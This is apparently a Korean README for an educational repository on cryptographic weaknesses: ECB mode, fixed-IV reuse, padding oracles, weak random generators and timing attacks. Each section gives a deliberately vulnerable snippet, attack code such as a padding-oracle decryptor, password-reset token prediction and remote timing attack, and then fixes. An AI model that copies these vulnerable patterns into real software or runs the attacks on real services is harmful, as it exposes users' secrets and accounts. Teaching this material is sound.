# 취약한 암호화 코드 및 Exploit 예제 모음

교육 목적으로 작성된 취약한 암호화 구현과 해당 취약점을 공격하는 exploit 코드 모음입니다.

⚠️ **경고**: 이 코드들은 교육 및 연구 목적으로만 사용해야 합니다. 실제 프로덕션 환경에서는 절대 사용하지 마세요!

## 📚 목차

1. [ECB 모드 취약점](#1-ecb-모드-취약점)
2. [IV 재사용 취약점](#2-iv-재사용-취약점)
3. [Padding Oracle 취약점](#3-padding-oracle-취약점)
4. [약한 난수 생성기](#4-약한-난수-생성기)
5. [타이밍 공격](#5-타이밍-공격)

## 🔧 설치

```bash
pip install -r requirements.txt
```

## 📖 취약점 상세 설명

### 1. ECB 모드 취약점

**파일**: `1_ecb_mode_vulnerable.py`, `1_ecb_mode_exploit.py`

#### 🔍 취약점 원리

**ECB(Electronic Codebook) 모드**는 가장 단순한 블록 암호화 모드로, 각 평문 블록을 독립적으로 암호화합니다.

```
평문 블록:    P1  P2  P3  P4
               ↓   ↓   ↓   ↓
암호화 키:    [K] [K] [K] [K]
               ↓   ↓   ↓   ↓
암호문 블록:  C1  C2  C3  C4

핵심 문제: P1 = P3 이면 → C1 = C3 (항상!)
```

**왜 취약한가?**
- **결정론적(Deterministic)**: 같은 평문 블록 + 같은 키 → 항상 같은 암호문
- **패턴 보존**: 평문의 패턴이 암호문에도 그대로 나타남
- **블록 독립성**: 각 블록이 독립적이라 블록 재배열이 가능

**취약한 코드 예시**:
```python
cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
ciphertext = cipher.encrypt(pad(plaintext, 16))
```

#### 💥 공격 기법 상세

**1. ECB 모드 탐지**
```
공격자 행동: "AAAAAAAAAAAAAAAA" (16바이트) 반복 전송
결과: 모든 암호문 블록이 동일 → ECB 모드 확인
```

**2. Byte-at-a-time 공격 (비밀 데이터 복구)**

공격 시나리오: 사용자 입력 + 비밀 데이터를 함께 암호화
```
encrypt(사용자입력 || "SECRET:password")
```

공격 단계:
1. **블록 크기 탐지**: 입력 길이를 늘려가며 암호문 길이 변화 관찰 (16바이트)
2. **한 바이트씩 복구**:
   ```
   입력: "AAAAAAAAAAAAAAA" (15바이트)
   암호화: "AAAAAAAAAAAAAAA" + "S" (비밀의 첫 글자)

   모든 가능한 문자로 사전 구성:
   "AAAAAAAAAAAAAAA" + "A" → 암호문1
   "AAAAAAAAAAAAAAA" + "B" → 암호문2
   ...
   "AAAAAAAAAAAAAAA" + "S" → 암호문? ✓ 일치!
   ```
3. 반복하여 전체 비밀 복구

**3. 블록 재배열 공격**
```
원본: [Block1: "transfer=1000"] [Block2: "to=alice"]
공격: [Block1: "transfer=9999"] [Block2: "to=alice"]
     블록1만 교체 → 금액 변조 성공!
```

#### 🛡️ 해결 방법
- **CBC, CTR, GCM 모드** 사용 (각 블록이 이전 블록/카운터에 의존)
- **랜덤 IV** 사용 (같은 평문도 다른 암호문 생성)
- **인증된 암호화** (GCM) - 변조 탐지

**안전한 코드**:
```python
iv = get_random_bytes(16)  # 매번 랜덤!
cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(plaintext, 16))
# IV와 함께 저장: iv + ciphertext
```

**실행**:
```bash
python3 1_ecb_mode_vulnerable.py  # 취약점 시연
python3 1_ecb_mode_exploit.py     # 공격 데모
```

---

### 2. IV 재사용 취약점

**파일**: `2_iv_reuse_vulnerable.py`, `2_iv_reuse_exploit.py`

#### 🔍 취약점 원리

**CBC(Cipher Block Chaining) 모드**는 각 블록이 이전 블록에 의존하는 암호화 모드입니다.

**CBC 암호화 과정**:
```
첫 블록:     P1 ⊕ IV  →  E(K)  →  C1
두번째 블록: P2 ⊕ C1  →  E(K)  →  C2
세번째 블록: P3 ⊕ C2  →  E(K)  →  C3
```

**IV 재사용 시 문제**:
```
메시지1: P1 ⊕ IV → C1
메시지2: P1 ⊕ IV → C1  (같은 평문 + 같은 IV = 같은 암호문!)

공격자가 알 수 있는 정보:
- 두 메시지의 첫 블록이 같다
- 평문 패턴 추론 가능
```

**취약한 코드**:
```python
FIXED_IV = b'1234567890123456'  # 고정된 IV (위험!)
cipher = AES.new(key, AES.MODE_CBC, FIXED_IV)
ciphertext = cipher.encrypt(pad(plaintext, 16))
```

#### 💥 공격 기법 상세

**1. IV 재사용 탐지**
```python
# 같은 평문을 두 번 암호화
ciphertext1 = encrypt("test message")
ciphertext2 = encrypt("test message")

if ciphertext1 == ciphertext2:
    print("IV 재사용 탐지! ECB 모드이거나 고정 IV 사용")
```

**2. 비트 플리핑 공격 (Bit Flipping)**

CBC 복호화 원리:
```
P1 = D(C1) ⊕ IV
```

공격자가 IV를 알거나 변조할 수 있으면:
```
원본: P1 = D(C1) ⊕ IV
목표: P1' = "admin" (관리자로 변조)

필요한 IV':
IV' = IV ⊕ P1 ⊕ P1'

예시:
원본 평문: "user:attacker"
목표 평문: "user:adminXXX"
→ IV의 해당 바이트를 XOR 조작
```

**공격 코드 핵심**:
```python
# 원본 평문과 목표 평문
original = b"user:attacker"
target   = b"user:adminXXX"

# 변조된 IV 계산
iv_modified = xor_bytes(xor_bytes(IV, original), target)

# 변조된 IV로 복호화 → 평문 변조 성공!
```

**3. 알려진 평문 공격**

공격자가 평문 일부를 알고 있을 때:
```
알려진: "Transfer 1000 won to Alice"
모르는: "Transfer ???? won to ?????"

같은 IV 사용 시:
- 첫 16바이트가 같으면 암호문도 같음
- "Transfer 1000 " 부분 확인 가능
- 패턴 분석으로 나머지 추론
```

**4. 재생 공격 (Replay Attack)**
```
1. 공격자가 정상 거래 암호문 가로채기:
   암호문: E("Transfer 1000 won", IV_fixed)

2. 같은 암호문을 재전송
   → 서버는 유효한 암호문으로 인식
   → 동일한 거래 반복 실행!

해결: Timestamp/Nonce 추가 필요
```

#### 🛡️ 해결 방법

**1. 랜덤 IV 사용**:
```python
# 매번 새로운 IV 생성
iv = get_random_bytes(16)  # os.urandom()으로 생성
cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(plaintext, 16))

# IV와 암호문 함께 저장/전송
data = iv + ciphertext
```

**2. 인증된 암호화 (권장)**:
```python
# GCM 모드: 암호화 + 인증
nonce = get_random_bytes(12)
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
ciphertext, tag = cipher.encrypt_and_digest(plaintext)
# 변조 시도 시 자동으로 탐지됨
```

**3. 메시지 인증 코드 (MAC) 추가**:
```python
# HMAC으로 무결성 보장
mac = hmac.new(mac_key, iv + ciphertext, hashlib.sha256).digest()
# 저장: iv + ciphertext + mac
```

**실행**:
```bash
python3 2_iv_reuse_vulnerable.py  # 취약점 시연
python3 2_iv_reuse_exploit.py     # 공격 데모
```

---

### 3. Padding Oracle 취약점

**파일**: `3_padding_oracle_vulnerable.py`, `3_padding_oracle_exploit.py`

#### 🔍 취약점 원리

**PKCS#7 패딩**은 블록 암호화에서 마지막 블록을 채우는 방법입니다:
```
평문이 13바이트고 블록이 16바이트라면:
"Hello World!!" + 0x03 0x03 0x03

패딩 규칙:
- 1바이트 부족: 0x01
- 2바이트 부족: 0x02 0x02
- 3바이트 부족: 0x03 0x03 0x03
- 블록이 딱 맞음: 0x10 * 16 (전체 블록 추가)
```

**Padding Oracle이란?**
서버가 패딩 검증 결과를 구분하여 알려주는 것:
```python
# 취약한 서버 응답
try:
    plaintext = unpad(decrypted_data, 16)
    return {"status": "success", "data": plaintext}
except ValueError:
    return {"status": "error", "message": "Invalid padding"}  # ← 정보 유출!
```

**왜 위험한가?**
공격자는 패딩이 올바른지 여부만 알 수 있어도 **암호문을 완전히 복호화** 할 수 있습니다!

#### 💥 공격 기법 상세

**핵심 원리**: CBC 복호화 과정을 역이용
```
P = D(C) ⊕ IV
```

**공격 단계 (한 블록 복구)**:

1. **마지막 바이트 찾기**:
```
암호문 블록: C = [c0, c1, c2, ..., c15]
조작된 IV:  IV' = [?, ?, ?, ..., ?, g]

복호화: P15 = D(C15) ⊕ g

목표: P15의 값이 0x01이 되도록 g 찾기
→ 패딩이 올바르면 서버가 "Success" 반환

g를 0~255까지 시도:
- g=123일 때 "Success" → P15 = D(C15) ⊕ 123 = 0x01
- 따라서: D(C15) = 123 ⊕ 0x01 = 122
- 실제 평문: P15 = 122 ⊕ IV[15]
```

2. **두 번째 바이트 찾기**:
```
이제 패딩이 0x02 0x02가 되도록 조작:
IV'[15] = D(C15) ⊕ 0x02  (이미 알고 있음)
IV'[14] = g (찾아야 할 값)

g를 0~255까지 시도하여 "Success" 찾기
→ P14 복구
```

3. **반복하여 전체 블록 복구**

**실제 공격 코드 흐름**:
```python
def padding_oracle(ciphertext):
    """서버에 복호화 요청, 패딩 유효성만 반환"""
    response = server.decrypt(ciphertext)
    return response["message"] != "Invalid padding"

def decrypt_block(ciphertext_block, iv):
    intermediate = bytearray(16)  # D(C) 값

    # 뒤에서부터 한 바이트씩
    for pad_value in range(1, 17):
        # 이미 알아낸 바이트들을 패딩에 맞게 조정
        attack_iv = bytearray(16)
        for i in range(16 - pad_value + 1, 16):
            attack_iv[i] = intermediate[i] ^ pad_value

        # 현재 바이트 찾기
        for byte_val in range(256):
            attack_iv[16 - pad_value] = byte_val

            if padding_oracle(attack_iv + ciphertext_block):
                # 올바른 패딩 발견!
                intermediate[16 - pad_value] = byte_val ^ pad_value
                break

    # 실제 평문 = intermediate ⊕ IV
    plaintext = xor_bytes(intermediate, iv)
    return plaintext
```

**공격 효율**:
- 블록당 평균 시도 횟수: 16 × 128 = 2,048회
- 256비트 암호문: 약 4,096회 요청으로 완전 복호화
- **키를 모르고도 복호화 가능!**

#### 🎯 실제 사례

**2010년 - ASP.NET 취약점 (MS10-070)**
- ASP.NET이 패딩 오류와 MAC 오류를 다른 응답 시간으로 반환
- 수천 개의 웹사이트 영향
- 세션 쿠키 복호화, ViewState 위조 가능

**2012년 - TLS CBC 취약점 (BEAST, Lucky 13)**
- TLS의 CBC 구현에서 타이밍 기반 Padding Oracle
- HTTPS 암호화 통신 해독 가능

#### 🛡️ 해결 방법

**1. 모든 오류를 동일하게 처리**:
```python
def secure_decrypt(ciphertext):
    try:
        plaintext = unpad(cipher.decrypt(ciphertext), 16)
        return {"status": "success"}
    except:
        # 패딩 오류든, MAC 오류든, 길이 오류든 모두 동일
        return {"status": "error", "message": "Decryption failed"}
```

**2. 인증된 암호화 사용 (최선)**:
```python
# AES-GCM: MAC 검증 후 복호화
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
try:
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
except ValueError:
    # MAC 실패 - 패딩 검증 전에 차단됨
    return "Authentication failed"
```

**3. 상수 시간 검증**:
```python
import hmac

def constant_time_decrypt(ciphertext):
    # 항상 전체 복호화 + 검증 수행
    decrypted = cipher.decrypt(ciphertext)

    # 상수 시간 비교
    is_valid = verify_padding(decrypted)  # 항상 전체 검사
    is_auth_valid = verify_mac(ciphertext)

    if is_valid and is_auth_valid:
        return unpad(decrypted)
    else:
        # 어느 것이 실패했는지 알려주지 않음
        raise DecryptionError("Failed")
```

**실행**:
```bash
python3 3_padding_oracle_vulnerable.py  # 취약점 시연
python3 3_padding_oracle_exploit.py     # 공격 데모 (시간 소요)
```

---

### 4. 약한 난수 생성기

**파일**: `4_weak_random_vulnerable.py`, `4_weak_random_exploit.py`

#### 🔍 취약점 원리

**PRNG vs CSPRNG**:
```
PRNG (Pseudo-Random Number Generator):
- 목적: 시뮬레이션, 게임 등
- Python random 모듈
- 예측 가능한 시퀀스 생성
- 속도 빠름

CSPRNG (Cryptographically Secure PRNG):
- 목적: 암호화, 보안 토큰 생성
- secrets, os.urandom()
- 예측 불가능
- 다음 값을 알아도 이전 값 추론 불가
```

**Python random의 문제점**:
```python
import random
import time

# Mersenne Twister 알고리즘 사용
random.seed(int(time.time()))  # 현재 시간으로 시드
key = random.getrandbits(128)  # 128비트 키 생성

문제:
1. 시드가 예측 가능 (현재 시간)
2. 시드만 알면 전체 시퀀스 재현 가능
3. 624개의 연속된 값으로 내부 상태 복구 가능
```

**취약한 사용 예시**:
```python
# ❌ 위험한 코드
random.seed(time.time())
session_token = random.randbytes(32)
reset_token = hashlib.md5(f"{user}:{time.time()}".encode()).hexdigest()
api_key = hashlib.sha256(f"{username}:{timestamp}".encode()).hexdigest()
```

#### 💥 공격 기법 상세

**1. 타임스탬프 기반 키 브루트포스**

시나리오: 암호화 키를 현재 시간으로 생성
```python
# 서버 코드 (취약)
timestamp = int(time.time())  # 예: 1704556800
random.seed(timestamp)
key = bytes([random.randint(0, 255) for _ in range(16)])
```

공격:
```python
# 암호화가 수행된 대략적 시간을 알고 있다면
# (서버 로그, HTTP 헤더, 타임스탬프 등)

approximate_time = 1704556800  # 2024-01-06 20:00:00

# ±1시간 범위 (3600초) 브루트포스
for offset in range(-3600, 3601):
    test_timestamp = approximate_time + offset
    random.seed(test_timestamp)
    test_key = bytes([random.randint(0, 255) for _ in range(16)])

    # 복호화 시도
    if try_decrypt(ciphertext, test_key):
        print(f"키 발견! timestamp={test_timestamp}")
        break

시간 복잡도: O(시간 범위) - 수초 내 완료
```

**2. 비밀번호 재설정 토큰 예측**

```python
# 취약한 토큰 생성
def generate_reset_token(user_id):
    timestamp = int(time.time())
    return hashlib.md5(f"{user_id}:{timestamp}".encode()).hexdigest()

# 공격
user_id = "victim@example.com"
current_time = int(time.time())

# 최근 10분(600초) 내 모든 가능한 토큰 생성
possible_tokens = []
for offset in range(-600, 1):
    timestamp = current_time + offset
    token = hashlib.md5(f"{user_id}:{timestamp}".encode()).hexdigest()
    possible_tokens.append(token)

# 각 토큰으로 재설정 시도
for token in possible_tokens:
    if try_reset_password(user_id, token):
        print("비밀번호 재설정 성공!")
```

**3. OTP 예측**

```python
# 취약한 OTP (시간 기반이지만 안전하지 않은 시드)
def generate_otp(user_id):
    time_window = int(time.time()) // 30  # 30초 윈도우
    random.seed(time_window + hash(user_id))
    return ''.join([str(random.randint(0, 9)) for _ in range(6)])

# 공격
user_id = "victim"
current_window = int(time.time()) // 30

# 현재 윈도우와 다음 윈도우의 OTP 미리 계산
for window in [current_window, current_window + 1]:
    random.seed(window + hash(user_id))
    otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    print(f"예측 OTP: {otp}")
```

**4. Mersenne Twister 상태 복구 공격**

만약 공격자가 624개의 연속된 32비트 난수를 얻을 수 있다면:
```python
# 624개의 출력으로 내부 상태 완전 복구
observed_outputs = [random.getrandbits(32) for _ in range(624)]

# 내부 상태 복구 (복잡한 수학적 과정)
internal_state = recover_mt_state(observed_outputs)

# 이후 모든 난수 예측 가능!
future_values = predict_next_values(internal_state, count=1000)
```

#### 🎯 실제 사례

**2008년 - Debian OpenSSL 취약점**
- PRNG 시드에 PID만 사용 (32,768가지 가능성)
- 생성된 모든 SSH 키 예측 가능
- 수백만 개의 서버 영향

**2012년 - Android SecureRandom 취약점**
- Bitcoin 지갑에서 약한 난수 사용
- 개인 키 중복 생성 → 자금 도난

**2013년 - Dual_EC_DRBG 백도어**
- NSA가 백도어를 심은 난수 생성기
- 알려진 상수로 출력 예측 가능

#### 🛡️ 해결 방법

**1. secrets 모듈 사용 (Python 3.6+)**:
```python
import secrets

# 토큰 생성
token = secrets.token_hex(32)      # 64자 hex 문자열
token_bytes = secrets.token_bytes(32)  # 32바이트
token_url = secrets.token_urlsafe(32)  # URL 안전

# 난수 생성
random_number = secrets.randbelow(100)  # 0~99
random_choice = secrets.choice(['a', 'b', 'c'])
```

**2. os.urandom() 사용**:
```python
import os

# 운영체제의 CSPRNG 직접 사용
random_bytes = os.urandom(32)

# 키 생성
key = os.urandom(32)  # 256비트 키
iv = os.urandom(16)   # 128비트 IV
```

**3. cryptography 라이브러리**:
```python
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import os

# 비밀번호에서 키 유도
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=os.urandom(16),  # 랜덤 솔트
    iterations=100000,
)
key = kdf.derive(password.encode())
```

**비교표**:
```
┌─────────────────┬──────────────┬──────────────┬─────────────┐
│ 모듈            │ 암호학 안전  │ 예측 가능    │ 사용 목적   │
├─────────────────┼──────────────┼──────────────┼─────────────┤
│ random          │ ❌           │ ✓            │ 시뮬레이션  │
│ secrets         │ ✓            │ ❌           │ 보안 토큰   │
│ os.urandom()    │ ✓            │ ❌           │ 암호화 키   │
│ numpy.random    │ ❌           │ ✓            │ 과학 계산   │
└─────────────────┴──────────────┴──────────────┴─────────────┘
```

**실행**:
```bash
python3 4_weak_random_vulnerable.py  # 취약점 시연
python3 4_weak_random_exploit.py     # 공격 데모
```

---

### 5. 타이밍 공격

**파일**: `5_timing_attack_vulnerable.py`, `5_timing_attack_exploit.py`

#### 🔍 취약점 원리

**타이밍 공격 (Timing Attack)**은 암호학적 연산의 실행 시간을 측정하여 비밀 정보를 추출하는 사이드 채널 공격입니다.

**취약한 문자열 비교**:
```python
def verify_token_vulnerable(expected, provided):
    if len(expected) != len(provided):
        return False

    for i in range(len(expected)):
        if expected[i] != provided[i]:
            return False  # 다른 문자 발견 시 즉시 반환!

    return True

문제: 일치하는 문자가 많을수록 비교 시간이 길어짐
```

**시간 차이 발생 원리**:
```
토큰: "ABCDEF123456"

시도1: "XXXXXX123456"
      ↑ 첫 글자 불일치 → 즉시 반환 (빠름)

시도2: "AXXXXX123456"
      ↑ 두 번째 글자 불일치 → 약간 느림

시도3: "ABCXXX123456"
      ↑ 네 번째 글자 불일치 → 더 느림

시도4: "ABCDEF123456"
      모두 일치 → 가장 느림
```

**측정 가능한 시간 차이**:
- 문자 1개 비교: 약 1-10 나노초
- 네트워크를 통한 원격 공격도 가능 (마이크로초 단위 측정)
- 통계적 방법으로 노이즈 제거

#### 💥 공격 기법 상세

**1. 한 바이트씩 복구 (Byte-by-byte)**

```python
def timing_attack(target_url, key_length):
    discovered = ""

    for position in range(key_length):
        max_time = 0
        best_char = None

        # 각 문자 시도
        for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
            # 테스트 키 구성
            test_key = discovered + char + "X" * (key_length - position - 1)

            # 여러 번 측정하여 평균
            times = []
            for _ in range(100):  # 통계적 신뢰도
                start = time.perf_counter()
                response = requests.get(target_url,
                                       headers={"API-Key": test_key})
                elapsed = time.perf_counter() - start
                times.append(elapsed)

            avg_time = statistics.median(times)  # 중간값 사용

            # 가장 오래 걸린 문자 = 올바른 문자
            if avg_time > max_time:
                max_time = avg_time
                best_char = char

        discovered += best_char
        print(f"Position {position}: '{best_char}' (time: {max_time:.6f}s)")

    return discovered
```

**2. 타이밍 그래프 예시**:
```
비밀 키: "SECRET123"

문자별 평균 응답 시간 (위치 0):
A: 0.000120s  ─
B: 0.000118s  ─
C: 0.000121s  ─
...
S: 0.000145s  ████ ← 가장 김! (올바른 문자)
T: 0.000119s  ─
...

문자별 평균 응답 시간 (위치 1):
A: 0.000150s  ─
B: 0.000148s  ─
...
E: 0.000175s  ████ ← 가장 김! (올바른 문자)
...
```

**3. 통계적 분석으로 노이즈 제거**

네트워크 지연, CPU 스케줄링 등의 노이즈 처리:
```python
def measure_with_statistics(test_key, samples=50):
    times = []

    for _ in range(samples):
        # CPU 캐시 워밍업
        _ = verify_key(test_key)

        # 실제 측정
        start = time.perf_counter()
        verify_key(test_key)
        elapsed = time.perf_counter() - start
        times.append(elapsed)

    # 이상치 제거 (상위/하위 10% 제거)
    times.sort()
    trimmed = times[len(times)//10 : -len(times)//10]

    return statistics.mean(trimmed)
```

**4. 원격 타이밍 공격**

로컬보다 어렵지만 여전히 가능:
```python
# 네트워크 지연 보정
def remote_timing_attack():
    # 1. 베이스라인 측정 (틀린 키)
    baseline_times = []
    for _ in range(100):
        start = time.time()
        requests.get(url, headers={"Key": "WRONG_KEY"})
        baseline_times.append(time.time() - start)

    baseline = statistics.median(baseline_times)

    # 2. 각 문자 시도 시 베이스라인 대비 증가량 측정
    for char in charset:
        times = []
        for _ in range(100):
            start = time.time()
            requests.get(url, headers={"Key": guess + char})
            times.append(time.time() - start)

        # 베이스라인 대비 증가량
        increase = statistics.median(times) - baseline

        if increase > threshold:  # 유의미한 증가
            found_char = char
```

#### 🎯 실제 사례

**2016년 - Lucky Microseconds (OpenSSL)**
- AES-NI 명령어의 캐시 타이밍 차이
- HTTPS 트래픽 복호화

**2017년 - Meltdown & Spectre**
- CPU 투기적 실행의 타이밍 사이드 채널
- 커널 메모리 읽기 가능

**2020년 - Minerva 공격**
- ECDSA 서명 생성 시 타이밍 차이
- TLS 개인 키 추출

**실제 취약점 발견 사례**:
```python
# Keycloak (2020) - 비밀번호 재설정
def verify_token(expected_token, provided_token):
    return expected_token == provided_token  # 취약!

# 공격자가 타이밍으로 토큰 복구 가능
```

#### 🛡️ 해결 방법

**1. hmac.compare_digest() 사용 (상수 시간 비교)**:
```python
import hmac

def verify_token_secure(expected, provided):
    # 상수 시간 비교 - 일치 여부와 무관하게 항상 같은 시간
    return hmac.compare_digest(expected, provided)

# 내부 구현 (단순화):
def constant_time_compare(a, b):
    if len(a) != len(b):
        return False

    result = 0
    for x, y in zip(a, b):
        result |= ord(x) ^ ord(y)  # XOR 누적

    # 모든 바이트를 항상 비교!
    return result == 0
```

**2. 해시 후 비교**:
```python
import hashlib
import hmac

def verify_token_hashed(expected, provided):
    # 해시로 길이 정규화
    expected_hash = hashlib.sha256(expected.encode()).digest()
    provided_hash = hashlib.sha256(provided.encode()).digest()

    # 상수 시간 비교
    return hmac.compare_digest(expected_hash, provided_hash)
```

**3. 인위적 지연 추가 (부분적 해결)**:
```python
import time
import random

def verify_with_delay(expected, provided):
    # 랜덤 지연 (타이밍 차이 숨김)
    time.sleep(random.uniform(0.001, 0.003))

    result = hmac.compare_digest(expected, provided)

    # 결과와 무관하게 동일한 지연
    time.sleep(random.uniform(0.001, 0.003))

    return result

주의: 완벽한 해결책 아님 (통계적으로 여전히 구분 가능)
```

**4. Rate Limiting**:
```python
from functools import wraps
import time

def rate_limit(max_calls=10, time_window=60):
    """1분에 10번까지만 허용"""
    calls = {}

    def decorator(func):
        @wraps(func)
        def wrapper(user_id, *args, **kwargs):
            now = time.time()
            if user_id not in calls:
                calls[user_id] = []

            # 시간 윈도우 내 호출만 유지
            calls[user_id] = [t for t in calls[user_id]
                             if now - t < time_window]

            if len(calls[user_id]) >= max_calls:
                raise Exception("Rate limit exceeded")

            calls[user_id].append(now)
            return func(user_id, *args, **kwargs)

        return wrapper
    return decorator

@rate_limit(max_calls=5, time_window=60)
def verify_api_key(user_id, key):
    return hmac.compare_digest(expected_key, key)
```

**안전한 인증 흐름**:
```python
import hmac
import hashlib
import secrets

class SecureAuthenticator:
    def __init__(self):
        self.tokens = {}

    def create_token(self, user_id):
        # 암호학적으로 안전한 토큰 생성
        token = secrets.token_urlsafe(32)
        # 토큰 해시 저장 (타이밍 공격 방지)
        token_hash = hashlib.sha256(token.encode()).digest()
        self.tokens[user_id] = token_hash
        return token

    def verify_token(self, user_id, provided_token):
        if user_id not in self.tokens:
            # 존재하지 않는 경우도 동일한 시간
            dummy_hash = hashlib.sha256(b"dummy").digest()
            hmac.compare_digest(dummy_hash, dummy_hash)
            return False

        expected_hash = self.tokens[user_id]
        provided_hash = hashlib.sha256(provided_token.encode()).digest()

        # 상수 시간 비교
        return hmac.compare_digest(expected_hash, provided_hash)
```

**실행**:
```bash
python3 5_timing_attack_vulnerable.py  # 취약점 시연
python3 5_timing_attack_exploit.py     # 공격 데모
```

---

## 🎯 학습 목표

이 예제들을 통해 다음을 학습할 수 있습니다:

1. **암호화의 올바른 사용법**: 단순히 암호화만 하는 것이 아닌, 올바른 모드와 파라미터 선택의 중요성
2. **일반적인 암호화 실수**: 실제로 자주 발생하는 취약점 패턴 이해
3. **공격 기법**: 각 취약점을 어떻게 공격할 수 있는지 실습
4. **방어 기법**: 각 취약점에 대한 올바른 해결 방법

## 🔒 보안 권장사항

### 암호화 사용 시 체크리스트

- [ ] ECB 모드 대신 CBC, CTR, GCM 등 사용
- [ ] 매번 랜덤한 IV/Nonce 생성
- [ ] 인증된 암호화 사용 (GCM, EAX, ChaCha20-Poly1305)
- [ ] 암호학적으로 안전한 난수 생성기 사용 (`secrets`, `os.urandom()`)
- [ ] 상수 시간 비교 함수 사용 (`hmac.compare_digest()`)
- [ ] 키 관리: 하드코딩 금지, 안전한 저장소 사용
- [ ] 패딩 오류를 포함한 모든 오류에 동일한 응답
- [ ] 타임스탬프/Nonce로 재생 공격 방지

### Python 암호화 권장 라이브러리

```python
# ✅ 권장
from cryptography.fernet import Fernet  # 간단한 대칭 암호화
from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # 인증된 암호화
import secrets  # 안전한 난수 생성
import hmac  # 상수 시간 비교

# ❌ 비권장
import random  # 암호학적으로 안전하지 않음
# ECB 모드 사용
# 고정된 IV 사용
# 직접적인 == 비교로 토큰/키 검증
```

## 📚 추가 학습 자료

- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [CWE-327: Use of a Broken or Risky Cryptographic Algorithm](https://cwe.mitre.org/data/definitions/327.html)
- [Cryptopals Crypto Challenges](https://cryptopals.com/)
- [Python Cryptography Documentation](https://cryptography.io/)

## ⚖️ 라이센스 및 면책

이 코드는 교육 목적으로만 제공됩니다. 이 코드를 악의적인 목적으로 사용하는 것은 법적으로 금지되어 있습니다.
승인되지 않은 시스템에 대한 공격은 불법이며, 사용자는 모든 법적 책임을 집니다.

**합법적 사용 사례**:
- 보안 교육 및 훈련
- CTF (Capture The Flag) 대회
- 승인된 침투 테스트
- 보안 연구
- 자신이 소유한 시스템 테스트

---

**작성 목적**: 암호화 보안 교육 및 안전한 코딩 실습

**권장 환경**: Python 3.8+
